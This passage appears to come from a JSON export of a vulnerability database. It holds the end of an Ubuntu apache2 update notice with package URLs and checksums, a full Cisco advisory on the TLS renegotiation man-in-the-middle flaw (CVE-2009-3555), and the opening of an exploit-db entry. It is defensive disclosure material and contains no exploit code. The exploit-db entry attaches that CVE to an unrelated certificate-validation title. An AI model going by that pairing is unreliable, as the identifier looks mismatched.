5562ea5a0e6f01ba12adda3afb65c1b0\r\n\r\nUpdated packages for Ubuntu 9.10:\r\n\r\n  Source archives:\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.12-1ubuntu2.1.di \\\r\nff.gz  Size/MD5:   185244 1ef59f9642bd9efa35e0808ea804cd0b\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.12-1ubuntu2.1.ds \\\r\nc  Size/MD5:     1888 d3bfdecefdd8b1adec8ab35dcf85d2b3\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.12.orig.tar.gz\r\n      Size/MD5:  6678149 17f017b571f88aa60abebfe2945d7caf\r\n\r\n  Architecture independent packages:\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-doc_2.2.12-1ubuntu2. \\\r\n1_all.deb  Size/MD5:  2246560 be12bcc117bf165ffd3401486186762e\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-event_2.2.12-1ub \\\r\nuntu2.1_all.deb  Size/MD5:     2336 009d381342b0be5280835a46c91f01d9\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-prefork_2.2.12-1 \\\r\nubuntu2.1_all.deb  Size/MD5:     2374 7545a3750acea08e95bee86f6a3247e2\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-mpm-worker_2.2.12-1u \\\r\nbuntu2.1_all.deb  Size/MD5:     2314 17719223d92d46821098ce178b5947d6\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2.2-common_2.2.12-1ubu \\\r\nntu2.1_all.deb  Size/MD5:   284782 4321e3201d8e8d1a9e3c6fbe6864102b\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2_2.2.12-1ubuntu2.1_al \\\r\nl.deb  Size/MD5:     1424 7b4d96008368549d5600a8c1f64a7559\r\n    http://security.ubuntu.com/ubuntu/pool/universe/a/apache2/apache2-mpm-itk_2.2.12-1 \\\r\nubuntu2.1_all.deb  Size/MD5:     2366 46add3d428c97fa69a8848a3e4025bb0\r\n\r\n  amd64 architecture (Athlon64, Opteron, EM64T Xeon):\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-prefork-dev_2.2.12-1 \\\r\nubuntu2.1_amd64.deb  Size/MD5:   137080 91e4f72d0f1f0abe91555e1497558fc2\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-threaded-dev_2.2.12- \\\r\n1ubuntu2.1_amd64.deb  Size/MD5:   138176 5fd6a5ed536306528f9f2c1a0281ad70\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-utils_2.2.12-1ubuntu \\\r\n2.1_amd64.deb  Size/MD5:   156646 cfa55666363303b3f44a24fa2929bf01\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2.2-bin_2.2.12-1ubuntu \\\r\n2.1_amd64.deb  Size/MD5:  1399630 82b36d57faa29a646e72a1125600c11c\r\n    http://security.ubuntu.com/ubuntu/pool/universe/a/apache2/apache2-suexec-custom_2. \\\r\n2.12-1ubuntu2.1_amd64.deb  Size/MD5:    92488 ddebef9d1a537520380f85b63c512bef\r\n    http://security.ubuntu.com/ubuntu/pool/universe/a/apache2/apache2-suexec_2.2.12-1u \\\r\nbuntu2.1_amd64.deb  Size/MD5:    90880 c6d163edf145da8ff6d102dc0dd1f8d7\r\n\r\n  i386 architecture (x86 compatible Intel/AMD):\r\n\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-prefork-dev_2.2.12-1 \\\r\nubuntu2.1_i386.deb  Size/MD5:   137102 69dcd0519ca612e02102f52dcb50bf7f\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-threaded-dev_2.2.12- \\\r\n1ubuntu2.1_i386.deb  Size/MD5:   138200 17221b53903d664823a55faa1ec4d9a9\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2-utils_2.2.12-1ubuntu \\\r\n2.1_i386.deb  Size/MD5:   155166 4347806710edff47fc051b4a68d5b448\r\n    http://security.ubuntu.com/ubuntu/pool/main/a/apache2/apache2.2-bin_2.2.12-1ubuntu \\\r\n2.1_i386.deb  Size/MD5:  1309136 d9a7df212b315fc6f77fc87fa8eb4a04\r\n    http://security.ubuntu.com/ubuntu/pool/universe/a/apache2/apache2-suexec-custom_2. \\\r\n2.12-1ubuntu2.1_i386.deb  Size/MD5:    91876 289bf732dd4750a2ce61ab121b04b079\r\n    http://security.ubuntu.com/ubuntu/pool/universe/a/apache2/apache2-suexec_2.2.12-1u \\\r\nbuntu2.1_i386.deb  Size/MD5:    90316 add7f446f6b524343c0066a486dd299a\r\n\r\n  lpia architecture (Low Power Intel Architecture):\r\n\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-prefork-dev_2.2.12-1ubuntu2.1_ \\\r\nlpia.deb  Size/MD5:   137088 571e9f0370b5687acff25f71c4efe33e\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-threaded-dev_2.2.12-1ubuntu2.1 \\\r\n_lpia.deb  Size/MD5:   138192 816a6e033f02114553bbb3627b9c6f9c\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-utils_2.2.12-1ubuntu2.1_lpia.d \\\r\neb  Size/MD5:   155090 af8272dc794250c30cd2f66b82486dc2\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2.2-bin_2.2.12-1ubuntu2.1_lpia.d \\\r\neb  Size/MD5:  1290606 4c51de07f5a6fe9612de45369e6f35a5\r\n    http://ports.ubuntu.com/pool/universe/a/apache2/apache2-suexec-custom_2.2.12-1ubun \\\r\ntu2.1_lpia.deb  Size/MD5:    91830 06866386df811127f4fd71d6fb2a9e2a\r\n    http://ports.ubuntu.com/pool/universe/a/apache2/apache2-suexec_2.2.12-1ubuntu2.1_l \\\r\npia.deb  Size/MD5:    90312 9e68bd8111503135a4eae7265b0084ae\r\n\r\n  powerpc architecture (Apple Macintosh G3/G4/G5):\r\n\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-prefork-dev_2.2.12-1ubuntu2.1_ \\\r\npowerpc.deb  Size/MD5:   137096 61b24dbeb12d7998e5d7014c26410a99\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-threaded-dev_2.2.12-1ubuntu2.1 \\\r\n_powerpc.deb  Size/MD5:   138202 599898ff374bde8bfa388e2615064c5a\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-utils_2.2.12-1ubuntu2.1_powerp \\\r\nc.deb  Size/MD5:   161058 fea8f5b9a80bef9c4cb3405bc37160af\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2.2-bin_2.2.12-1ubuntu2.1_powerp \\\r\nc.deb  Size/MD5:  1390150 fb1a244728a509586b77d02930fcf10f\r\n    http://ports.ubuntu.com/pool/universe/a/apache2/apache2-suexec-custom_2.2.12-1ubun \\\r\ntu2.1_powerpc.deb  Size/MD5:    92400 572c3b0aa5ab717e8c4e4e8248aff1ff\r\n    http://ports.ubuntu.com/pool/universe/a/apache2/apache2-suexec_2.2.12-1ubuntu2.1_p \\\r\nowerpc.deb  Size/MD5:    90774 82011ebc757d31e690698cf9913e3adc\r\n\r\n  sparc architecture (Sun SPARC/UltraSPARC):\r\n\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-prefork-dev_2.2.12-1ubuntu2.1_ \\\r\nsparc.deb  Size/MD5:   137098 7f566dfade1678c72eac7dd923ab5987\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-threaded-dev_2.2.12-1ubuntu2.1 \\\r\n_sparc.deb  Size/MD5:   138202 09fbc3145d768cf1f204d47b50e21528\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2-utils_2.2.12-1ubuntu2.1_sparc. \\\r\ndeb  Size/MD5:   159488 7cb6c81588adaee162b8c85a1f69e7a7\r\n    http://ports.ubuntu.com/pool/main/a/apache2/apache2.2-bin_2.2.12-1ubuntu2.1_sparc. \\\r\ndeb  Size/MD5:  1297936 106b0b71f5e928c1d543973b5b1f015b\r\n    http://ports.ubuntu.com/pool/universe/a/apache2/apache2-suexec-custom_2.2.12-1ubun \\\r\ntu2.1_sparc.deb  Size/MD5:    92166 28899fe31226880dfa961d8b05e8fa43\r\n    http://ports.ubuntu.com/pool/universe/a/apache2/apache2-suexec_2.2.12-1ubuntu2.1_s \\\r\nparc.deb  Size/MD5:    90554 f207de0099ed259e2af736e8c82f91c2\n                              ",
            "cvss": {
                "score": 7.5,
                "vector": "AV:NETWORK/AC:LOW/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:12673"
        },
        {
            "bulletinFamily": "exploit",
            "description": "No description provided by source.",
            "modified": "2009-11-10T00:00:00",
            "published": "2009-11-10T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-12600",
            "id": "SSV:12600",
            "type": "seebug",
            "title": "Cisco Security Advisory: Transport Layer Security Renegotiation Vulnerability",
            "sourceData": "\n                                                -----BEGIN PGP SIGNED MESSAGE-----\r\nHash: SHA1\r\n\r\nCisco Security Advisory: Transport Layer Security Renegotiation\r\nVulnerability\r\n\r\nAdvisory ID: cisco-sa-20091109-tls\r\n\r\nhttp://www.cisco.com/warp/public/707/cisco-sa-20091109-tls.shtml\r\n\r\nRevision 1.0\r\n\r\nFor Public Release 2009 November 9 1600 UTC (GMT)\r\n\r\nSummary\r\n=======\r\n\r\nAn industry-wide vulnerability exists in the Transport Layer Security\r\n(TLS) protocol that could impact any Cisco product that uses any version\r\nof TLS and SSL. The vulnerability exists in how the protocol handles\r\nsession renegotiation and exposes users to a potential man-in-the-middle\r\nattack.\r\n\r\nThis advisory is posted at\r\nhttp://www.cisco.com/warp/public/707/cisco-sa-20091109-tls.shtml.\r\n\r\nAffected Products\r\n=================\r\n\r\nCisco is currently evaluating products for possible exposure to these\r\nTLS issues. Products will only be listed in the Vulnerable Products or\r\nProducts Confirmed Not Vulnerable sections of this advisory when a final\r\ndetermination about product exposure is made. Products that are not\r\nlisted in either of these two sections are still being evaluated.\r\n\r\nVulnerable Products\r\n- -------------------\r\n\r\nThis section will be updated when more information is available.\r\n\r\nProducts Confirmed Not Vulnerable\r\n- ---------------------------------\r\n\r\nThe following products are confirmed not vulnerable:\r\n\r\n  * Cisco AnyConnect VPN Client\r\n\r\nThis section will be updated when more information is available.\r\n\r\nDetails\r\n=======\r\n\r\nTLS and its predecessor, SSL, are cryptographic protocols that provide\r\nsecurity for communications over IP data networks such as the Internet.\r\nAn industry-wide vulnerability exists in the TLS protocol that could\r\nimpact any Cisco product that uses any version of TLS and SSL. The\r\nvulnerability exists in how the protocol handles session renegotiation\r\nand exposes users to a potential man-in-the-middle attack.\r\n\r\nThe following Cisco Bug IDs are being used to track potential exposure\r\nto the SSL and TLS issues. The bugs listed below do not confirm\r\nthat a product is vulnerable, but rather that the product is under\r\ninvestigation by the appropriate product teams.\r\n\r\nRegistered Cisco customers can view these bugs via Cisco's Bug Toolkit:\r\nhttp://www.cisco.com/pcgi-bin/Support/Bugtool/launch_bugtool.pl\r\n\r\n+------------------------------------------------------------+\r\n|          Product           |            Bug ID             |\r\n|----------------------------+-------------------------------|\r\n| Cisco Adaptive Security    | CSCtd01491                    |\r\n| Device Manager (ASDM)      |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco AON Software         | CSCtd01646                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco AON Healthcare for   | CSCtd01652                    |\r\n| HIPAA and ePrescription    |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Application and      | CSCtd01529                    |\r\n| Content Networking System  |                               |\r\n| (ACNS) Software            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Application          | CSCtd01480                    |\r\n| Networking Manager         |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco ASA 5500 Series      | CSCtd00697                    |\r\n| Adaptive Security          |                               |\r\n| Appliances                 |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco ASA Advanced         |                               |\r\n| Inspection and Prevention  | CSCtd01539                    |\r\n| (AIP) Security Services    |                               |\r\n| Module                     |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco AVS 3100 Series      | CSCtd01566                    |\r\n| Application Velocity       |                               |\r\n| System                     |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Catalyst 6500 Series | CSCtd06389                    |\r\n| SSL Services Module        |                               |\r\n|----------------------------+-------------------------------|\r\n| Firewall Services Module   | CSCtd04061                    |\r\n| FWSM                       |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco CSS 11000 Series     | CSCtd01636                    |\r\n| Content Services Switches  |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified SIP Phones   | CSCtd01446                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Data Center Network  | CSCtd02635                    |\r\n| Manager                    |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Data Mobility        | CSCtd02642                    |\r\n| Manager                    |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Digital Media        | CSCtd01703                    |\r\n| Encoders                   |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Digital Media        | CSCtd01692                    |\r\n| Manager                    |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Digital Media        | CSCtd01718                    |\r\n| Players                    |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Emergency Responder  | CSCtd02650                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco IOS Software         | CSCtd00658                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco IOS XE Software      | CSCtd00658                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco IOS XR Software      | CSCtd02658                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco IP Communicator      | CSCtd02662                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| CATOS                      | CSCtd00662                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco IronPort Appliances  | CSCtd02069                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified MeetingPlace | CSCtd02709                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco NAC Appliance (Clean | CSCtd01453                    |\r\n| Access)                    |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco NAC Guest Server     | CSCtd01462                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco NAC Profiler         | CSCtd02716                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Network Analysis     | CSCtd02729                    |\r\n| Module Software (NAM)      |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Network Registrar    | CSCtd02748                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco ONS 15500 Series     | CSCtd02769                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Physical Access      | CSCtd02777                    |\r\n| Gateways                   |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Physical Access      | CSCtd03912                    |\r\n| Manager                    |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Physical Security    | CSCtd03920                    |\r\n| ISM                        |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco QoS Device Manager   | CSCtd03923                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Secure Access        | CSCtd00725                    |\r\n| Control Server (ACS)       |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Secure Desktop       | CSCtd03928                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Secure Services      | CSCtd03935                    |\r\n| Client                     |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Security Agent CSA   | CSCtd02689                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Security Monitoring, | CSCtd02654                    |\r\n| Analysis and Response      |                               |\r\n| System (MARS)              |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified IP Phones    | CSCtd04121                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Service Control      | CSCtd04171                    |\r\n| Subscriber Manager         |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco TelePresence Manager | CSCtd01771                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Telepresence for Consumer  | CSCtd01752                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco TelePresence         | CSCtd01742                    |\r\n| Recording Server           |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Network Asset        | CSCtd04198                    |\r\n| Collector                  |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified              | CSCtd01282                    |\r\n| Communications Manager     |                               |\r\n| (CallManager)              |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Business     | CSCtd05731                    |\r\n| Attendant Console          |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Contact      | CSCtd05790                    |\r\n| Center Enterprise          |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Contact      | CSCtd05790                    |\r\n| Center Express             |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Contact      | CSCtd05755                    |\r\n| Center Management Portal   |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Contact      | CSCtd05790                    |\r\n| Center Products            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Department   | CSCtd05733                    |\r\n| Attendant Console          |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified E-Mail       | CSCtd05756                    |\r\n| Interaction Manager        |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Enterprise   | CSCtd05735                    |\r\n| Attendant Console          |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Mobile       | CSCtd05762                    |\r\n| Communicator               |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Mobility     | CSCtd05786                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Mobility     | CSCtd05783                    |\r\n| Advantage                  |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Operations   | CSCtd05784                    |\r\n| Manager                    |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Personal     | CSCtd05759                    |\r\n| Communicator               |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Presence     | CSCtd05791                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Provisioning | CSCtd05777                    |\r\n| Manager                    |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Quick        | CSCtd05738                    |\r\n| Connect                    |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Service      | CSCtd05780                    |\r\n| Monitor                    |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified Service      | CStCd05778                    |\r\n| Statistics Manager         |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unified SIP Proxy    | CSCtd05765                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Unity                | CSCtd02855                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco NX-OS Software       | CSCtd00699 and CSCtd00703     |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Video Portal         | CSCtd04097                    |\r\n|                            |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Video Surveillance   | CSCtd02831                    |\r\n| Media Server Software      |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Video Surveillance   | CSCtd02780                    |\r\n| Operations Manager         |                               |\r\n| Software                   |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Wide Area File       | CSCtd04106                    |\r\n| Services Software (WAFS)   |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Wireless Control     | CSCtd01625                    |\r\n| System                     |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Wireless LAN         | CSCtd01611                    |\r\n| Controller (WLAN)          |                               |\r\n|----------------------------+-------------------------------|\r\n| Cisco Wireless Location    | CSCtd04115                    |\r\n| Appliance                  |                               |\r\n|----------------------------+-------------------------------|\r\n| CiscoWorks Common Services | CSCtd01597                    |\r\n| Software                   |                               |\r\n|----------------------------+-------------------------------|\r\n| CiscoWorks Wireless LAN    | CSCtd04111                    |\r\n| Solution Engine (WLSE)     |                               |\r\n+------------------------------------------------------------+\r\n\r\nThis vulnerability has been assigned the Common Vulnerabilities and\r\nExposures (CVE) identifier CVE-2009-3555.\r\n\r\n\r\nVulnerability Scoring Details\r\n+----------------------------\r\n\r\nCisco has provided scores for the vulnerability in this advisory based\r\non the Common Vulnerability Scoring System (CVSS). The CVSS scoring in\r\nthis Security Advisory is done in accordance with CVSS version 2.0.\r\n\r\nCVSS is a standards-based scoring method that conveys vulnerability\r\nseverity and helps determine urgency and priority of response.\r\n\r\nCisco has provided a base and temporal score. Customers can then\r\ncompute environmental scores to assist in determining the impact of the\r\nvulnerability in individual networks.\r\n\r\nCisco has provided an FAQ to answer additional questions regarding CVSS\r\nat:\r\n\r\nhttp://www.cisco.com/web/about/security/intelligence/cvss-qandas.html\r\n\r\nCisco has also provided a CVSS calculator to help compute the\r\nenvironmental impact for individual networks at:\r\n\r\nhttp://intellishield.cisco.com/security/alertmanager/cvss\r\n\r\n* TLS Renegotiation Vulnerability (all Cisco Bugs above)\r\n\r\nCVSS Base Score - 4.3\r\n    Access Vector -            Network\r\n    Access Complexity -        Medium\r\n    Authentication -           None\r\n    Confidentiality Impact -   None\r\n    Integrity Impact -         Partial\r\n    Availability Impact -      None\r\n\r\nCVSS Temporal Score - 4.1\r\n    Exploitability -           Functional\r\n    Remediation Level -        Unavailable\r\n    Report Confidence -        Confirmed\r\n\r\n\r\nImpact\r\n======\r\n\r\nThis section will be updated when more information is available.\r\n\r\nSoftware Versions and Fixes\r\n===========================\r\n\r\nThis section will be updated to include fixed software versions for\r\naffected Cisco products as they become available.\r\n\r\nWorkarounds\r\n===========\r\n\r\nWorkarounds are being investigated. This section will be updated when\r\nmore information becomes available.\r\n\r\nObtaining Fixed Software\r\n========================\r\n\r\nCisco has released free software updates that address this\r\nvulnerability. Prior to deploying software, customers should consult\r\ntheir maintenance provider or check the software for feature set\r\ncompatibility and known issues specific to their environment.\r\n\r\nCustomers may only install and expect support for the feature\r\nsets they have purchased. By installing, downloading, accessing\r\nor otherwise using such software upgrades, customers agree to be\r\nbound by the terms of Cisco's software license terms found at\r\nhttp://www.cisco.com/en/US/docs/general/warranty/English/EU1KEN_.html,\r\nor as otherwise set forth at Cisco.com Downloads at\r\nhttp://www.cisco.com/public/sw-center/sw-usingswc.shtml.\r\n\r\nDo not contact psirt@cisco.com or security-alert@cisco.com for software\r\nupgrades.\r\n\r\nCustomers with Service Contracts\r\n- --------------------------------\r\n\r\nCustomers with contracts should obtain upgraded software through their\r\nregular update channels. For most customers, this means that upgrades\r\nshould be obtained through the Software Center on Cisco's worldwide\r\nwebsite at http://www.cisco.com.\r\n\r\nCustomers using Third Party Support Organizations\r\n- -------------------------------------------------\r\n\r\nCustomers whose Cisco products are provided or maintained through prior\r\nor existing agreements with third-party support organizations, such\r\nas Cisco Partners, authorized resellers, or service providers should\r\ncontact that support organization for guidance and assistance with the\r\nappropriate course of action in regards to this advisory.\r\n\r\nThe effectiveness of any workaround or fix is dependent on specific\r\ncustomer situations, such as product mix, network topology, traffic\r\nbehavior, and organizational mission. Due to the variety of affected\r\nproducts and releases, customers should consult with their service\r\nprovider or support organization to ensure any applied workaround or fix\r\nis the most appropriate for use in the intended network before it is\r\ndeployed.\r\n\r\nCustomers without Service Contracts\r\n- -----------------------------------\r\n\r\nCustomers who purchase direct from Cisco but do not hold a Cisco service\r\ncontract, and customers who purchase through third-party vendors but are\r\nunsuccessful in obtaining fixed software through their point of sale\r\nshould acquire upgrades by contacting the Cisco Technical Assistance\r\nCenter (TAC). TAC contacts are as follows.\r\n\r\n  * +1 800 553 2447 (toll free from within North America)\r\n  * +1 408 526 7209 (toll call from anywhere in the world)\r\n  * e-mail: tac@cisco.com\r\n\r\nCustomers should have their product serial number available and be\r\nprepared to give the URL of this notice as evidence of entitlement to a\r\nfree upgrade. Free upgrades for non-contract customers must be requested\r\nthrough the TAC.\r\n\r\nRefer to\r\nhttp://www.cisco.com/en/US/support/tsd_cisco_worldwide_contacts.html\r\nfor additional TAC contact information, including localized telephone\r\nnumbers, and instructions and e-mail addresses for use in various\r\nlanguages.\r\n\r\nExploitation and Public Announcements\r\n=====================================\r\n\r\nThis vulnerability was initially discovered by Marsh Ray and Steve\r\nDispensa from PhoneFactor, Inc.\r\n\r\nCisco is not aware of any malicious exploitation of this vulnerability.\r\n\r\nProof-of-concept exploit code has been published for this vulnerability.\r\n\r\nStatus of this Notice: INTERIM\r\n==============================\r\n\r\nTHIS DOCUMENT IS PROVIDED ON AN &quot;AS IS&quot; BASIS AND DOES NOT IMPLY\r\nANY KIND OF GUARANTEE OR WARRANTY, INCLUDING THE WARRANTIES OF\r\nMERCHANTABILITY OR FITNESS FOR A PARTICULAR USE. YOUR USE OF THE\r\nINFORMATION ON THE DOCUMENT OR MATERIALS LINKED FROM THE DOCUMENT IS\r\nAT YOUR OWN RISK. CISCO RESERVES THE RIGHT TO CHANGE OR UPDATE THIS\r\nDOCUMENT AT ANY TIME.\r\n\r\nA stand-alone copy or Paraphrase of the text of this document that omits\r\nthe distribution URL in the following section is an uncontrolled copy,\r\nand may lack important information or contain factual errors.\r\n\r\nDistribution\r\n============\r\n\r\nThis advisory is posted on Cisco's worldwide website at:\r\n\r\nhttp://www.cisco.com/warp/public/707/cisco-sa-20091109-tls.shtml\r\n\r\nIn addition to worldwide web posting, a text version of this notice is\r\nclear-signed with the Cisco PSIRT PGP key and is posted to the following\r\ne-mail and Usenet news recipients.\r\n\r\n  * cust-security-announce@cisco.com\r\n  * first-bulletins@lists.first.org\r\n  * bugtraq@securityfocus.com\r\n  * vulnwatch@vulnwatch.org\r\n  * cisco@spot.colorado.edu\r\n  * cisco-nsp@puck.nether.net\r\n  * full-disclosure@lists.grok.org.uk\r\n  * comp.dcom.sys.cisco@newsgate.cisco.com\r\n\r\nFuture updates of this advisory, if any, will be placed on Cisco's\r\nworldwide website, but may or may not be actively announced on mailing\r\nlists or newsgroups. Users concerned about this problem are encouraged\r\nto check the above URL for any updates.\r\n\r\nRevision History\r\n================\r\n\r\n+------------------------------------------------------------+\r\n| Revision 1.0  | 2009-November-9  | Initial public release  |\r\n+------------------------------------------------------------+\r\n\r\nCisco Security Procedures\r\n=========================\r\n\r\nComplete information on reporting security vulnerabilities\r\nin Cisco products, obtaining assistance with security\r\nincidents, and registering to receive security information\r\nfrom Cisco, is available on Cisco's worldwide website at\r\nhttp://www.cisco.com/en/US/products/products_security_vulnerability_policy.html.\r\nThis includes instructions for press inquiries regarding\r\nCisco security notices. All Cisco security advisories are available at\r\nhttp://www.cisco.com/go/psirt.\r\n\r\n+--------------------------------------------------------------------\r\nCopyright 2008-2009 Cisco Systems, Inc. All rights reserved.\r\n+--------------------------------------------------------------------\r\n\r\nUpdated: Nov 09, 2009                             Document ID: 111046\r\n-----BEGIN PGP SIGNATURE-----\r\nVersion: GnuPG v1.4.9 (GNU/Linux)\r\n\r\niEYEARECAAYFAkr4TCsACgkQ86n/Gc8U/uDNWgCfYptXVZhz0qn2DvRh2zUtZ5EF\r\nOS4AoJediPm3/t9XqYIdrjR5PNP25iY/\r\n=SkAu\r\n-----END PGP SIGNATURE-----\r\n\n                              ",
            "cvss": {
                "score": 5.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:NONE/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/seebug/SSV:12600"
        },
        {
            "bulletinFamily": "exploit",
            "description": "Mozilla NSS NULL Character CA SSL Certificate Validation Security Bypass Vulnerability. CVE-2009-3555. Remote exploits for multiple platform",
            "modified": "2009-11-10T00:00:00",
            "published": "2009-11-10T00:00:00",
            "id": "EDB-ID:10071",
            "href": "https://www.exploit-db.com/exploits/10071/",
            "type": "exploitdb",
            "title": "Mozilla NSS NULL Character CA SSL Certificate Validation Security Bypass Vulnerability",
